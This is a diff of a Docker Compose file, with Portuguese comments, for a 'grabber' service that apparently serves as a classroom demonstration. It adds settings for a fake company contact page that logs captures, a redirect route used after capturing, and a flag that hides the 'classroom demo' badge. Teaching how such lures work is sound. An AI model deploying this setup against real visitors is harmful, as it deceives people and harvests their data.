@@ -3,13 +3,8 @@
 # Dokploy: Applications -> Create Application -> tipo "Docker Compose" ->
 # aponte para este repositório -> defina o domínio -> Deploy.
 #
-# Variáveis que valem configurar no painel do Dokploy (Environment):
-#   TOKEN_PAINEL   senha do /painel. SEM ISSO o token é aleatório a cada boot
-#                  e o link do painel muda a cada deploy.
-#   URL_PUBLICA    ex.: https://contatos.seudominio.com  (só aparece no log)
-#   DIVULGAR       1 = mantém o selo "demonstração de aula" (padrão)
-#                  0 = remove o selo (só durante a demonstração em sala)
-#   DESTINO        URL para onde /r redireciona (opcional)
+# Todas as variáveis abaixo aparecem no painel Environment do Dokploy.
+# O valor depois de ":-" é o padrão usado quando a variável não é definida.
 
 services:
   grabber:
@@ -22,18 +17,50 @@ services:
 
     # Dokploy/Traefik fala com o container nesta porta.
     # Se o seu proxy já publica a porta, pode remover este bloco.
+    # A variável PORTA vale para os três lugares (mapeamento, app e healthcheck).
     ports:
-      - "8000:8000"
+      - "${PORTA:-8000}:${PORTA:-8000}"
 
     environment:
-      PORTA: "8000"
+      # ---------- servidor ----------
+      PORTA: "${PORTA:-8000}"
       HOST: "0.0.0.0"
-      ARQ_LOG: /dados/capturas.jsonl
-      # Troque por um valor seu. Vazio = token aleatório a cada boot.
-      TOKEN_PAINEL: ${TOKEN_PAINEL:-}
-      URL_PUBLICA: ${URL_PUBLICA:-}
-      DIVULGAR: ${DIVULGAR:-1}
-      DESTINO: ${DESTINO:-}
+      ARQ_LOG: "/dados/capturas.jsonl"
+
+      # ---------- painel e comportamento ----------
+      # Senha do /painel. Sem isso, o token é sorteado a cada boot e o link
+      # do painel muda a cada deploy (o valor sai no log do container).
+      TOKEN_PAINEL: "${TOKEN_PAINEL:-}"
+      # Domínio público; só aparece no log de inicialização.
+      URL_PUBLICA: "${URL_PUBLICA:-}"
+      # 1 = mantém o selo "demonstração de aula" na fachada (padrão)
+      # 0 = remove o selo (só no momento da demonstração em sala)
+      DIVULGAR: "${DIVULGAR:-1}"
+      # URL para onde a rota /r redireciona depois de capturar (opcional)
+      DESTINO: "${DESTINO:-}"
+
+      # ---------- fachada: empresa ----------
+      EMPRESA_NOME: "${EMPRESA_NOME:-Aurora Serviços}"
+      EMPRESA_RAMO: "${EMPRESA_RAMO:-Assessoria contábil e empresarial}"
+      EMPRESA_BIO: "${EMPRESA_BIO:-Canais oficiais de atendimento da matriz.}"
+      EMPRESA_CNPJ: "${EMPRESA_CNPJ:-00.000.000/0001-00}"
+      EMPRESA_ENDERECO: "${EMPRESA_ENDERECO:-Av. das Acácias, 1200 — Centro}"
+      EMPRESA_HORARIO: "${EMPRESA_HORARIO:-Segunda a sexta, das 8h às 17h}"
+
+      # ---------- fachada: contato 1 (botão em destaque) ----------
+      CONTATO1_NOME: "${CONTATO1_NOME:-Kelly Moreira}"
+      CONTATO1_CARGO: "${CONTATO1_CARGO:-Secretaria}"
+      CONTATO1_NUMERO: "${CONTATO1_NUMERO:-(11) 0000-0000}"
+
+      # ---------- fachada: contato 2 ----------
+      CONTATO2_NOME: "${CONTATO2_NOME:-Recursos Humanos}"
+      CONTATO2_CARGO: "${CONTATO2_CARGO:-RH}"
+      CONTATO2_NUMERO: "${CONTATO2_NUMERO:-(11) 0000-0001}"
+
+      # ---------- fachada: contato 3 ----------
+      CONTATO3_NOME: "${CONTATO3_NOME:-Contábil}"
+      CONTATO3_CARGO: "${CONTATO3_CARGO:-Financeiro}"
+      CONTATO3_NUMERO: "${CONTATO3_NUMERO:-(11) 0000-0002}"
 
     volumes:
       # O log precisa sobreviver a deploy/restart. Sem volume, cada deploy
@@ -42,7 +69,7 @@ services:
 
     healthcheck:
       test: ["CMD", "python3", "-c",
-             "import urllib.request,sys; sys.exit(0 if urllib.request.urlopen('http://127.0.0.1:8000/health', timeout=2).status==200 else 1)"]
+             "import urllib.request,sys; sys.exit(0 if urllib.request.urlopen('http://127.0.0.1:${PORTA:-8000}/health', timeout=2).status==200 else 1)"]
       interval: 30s
       timeout: 5s
       start_period: 5s
